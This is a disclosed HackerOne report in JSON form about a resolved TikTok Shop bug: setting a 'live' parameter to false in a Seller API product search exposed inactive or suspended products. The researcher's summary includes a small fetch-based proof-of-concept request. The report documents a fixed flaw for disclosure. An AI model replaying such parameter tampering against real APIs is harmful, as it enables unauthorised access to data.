{
  "id": 2295958,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjk1OTU4",
  "url": "https://hackerone.com/reports/2295958",
  "title": "Exploitable live argument in onClick Function leads to Data Leakage of Inactive/Suspended Products",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-12-23T20:53:23.631Z",
  "submitted_at": "2023-12-23T20:53:23.910Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "696e746c6f6c",
    "url": "/696e746c6f6c",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/o2d5k1jooxy710t5jthzfuf7r7bk/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 49708,
    "url": "https://hackerone.com/tiktok",
    "handle": "tiktok",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/roYPkZznCDFmy4VGkFPnbDrc/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/roYPkZznCDFmy4VGkFPnbDrc/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "TikTok",
      "twitter_handle": "",
      "website": "http://tiktok.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-07-19T22:23:09.936Z",
  "bug_reporter_agreed_on_going_public_at": "2024-06-04T22:01:28.339Z",
  "team_member_agreed_on_going_public_at": "2024-07-19T22:23:09.556Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 65,
    "name": "Business Logic Errors"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 117,
  "voters": [
    "supermancyber",
    "l0da",
    "d0dger",
    "k0ns0l",
    "shunya-zero",
    "aboalezz",
    "faav",
    "orange303",
    "hellcat44",
    "buraaqsec",
    "and 107 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 328810,
    "asset_type": "URL",
    "asset_identifier": "shop.tiktok.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 484104,
      "category": "team",
      "content": "Within the \"Search Product\" function in TikTok Shop Seller API, the ability to access inactive or suspended products could have been achieved by tampering with the \"live\" parameter in the API request. We thank @696e746c6f6c for reporting this to our team and confirming its remediation. ",
      "updated_at": "2024-07-15T22:49:47.531Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 1287576,
        "username": "tt_sr",
        "name": "Suhana Hyder",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2020-08-14T21:25:36.459Z",
        "url": "https://hackerone.com/tt_sr",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "id": 484105,
      "category": "researcher",
      "content": "TikTok's summary is brief. However, during a source code audit, I discovered the following detailed summary of how I came across this specific code snippet on TikTok\n```javascript\nonClick: function () {\n                        Fa('self-promotion', 'live', 'live_dashboard'),\n                        (0, de.xw) (m)\n                      }\n```\n where's `onClick` is a function assigned to an event and then within the `onClick` function, the `Fa()` function is called with three arguments: `self-promotion, live, and live_dashboard.` This function call is used for some live shopping ads. However It seems like that live status is not only for live products but also it was found out that it can be used for data leakage of inactive/suspended products with it's false boolean value but not true value and therefore this creates a security vulnerability.\nAs such attacker was able to make a `POST` request to the arbitrary endpoint using fetch API for example:\n```javascript\nconst fetch = require('node-fetch'); //\n\nconst url = 'https://*.tiktok.com/api/v1/xyz';\n\nconst postData = {\n  campaign_id: \"0\",\n  product_name: \"\",\n  page_index: 1,\n  page_size: 30,\n  live: false\n};\n\nconst headers = {\n // headers\n};\n\nfetch(url, {\n  method: 'POST',\n  headers: headers,\n  body: JSON.stringify(postData)\n})\n.then(response => {\n  if (!response.ok) {\n    throw new Error('error');\n  }\n  return response.json();\n})\n.then(data => {\n  console.log(data);\n})\n.catch(error => {\n  console.error('fetch error:', error);\n});\n```\nHowever if we don't include live JSON property in the request then response would return the following data from the back-end:\n```json\n   \"code\": 0,\n   \"data\": {\n       \"amount\": null,\n       \"invited_amount\": 0\n   },\n   \"message\": \"success\"\n}\n```\n\nThanks to the TikTok team for the bounty and the good fix that has been pushed!",
      "updated_at": "2024-07-15T22:56:58.085Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 2045840,
        "username": "696e746c6f6c",
        "name": "",
        "bio": "formerly unemployed now self unemployed",
        "cleared": false,
        "verified": true,
        "website": null,
        "location": "",
        "created_at": "2021-10-26T16:54:07.049Z",
        "url": "https://hackerone.com/696e746c6f6c",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/o2d5k1jooxy710t5jthzfuf7r7bk/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/o2d5k1jooxy710t5jthzfuf7r7bk/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NzY4MDc5NCwicHVyIjoiYmxvYl9pZCJ9fQ==--452b3b64b16004b04732c3027fe182355d2a8483/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--cf3aeca803d1baf476958c689ca7b472a4cb54f1/G0R6-x-X0AE3arC.jpg"
        }
      }
    }
  ]
}
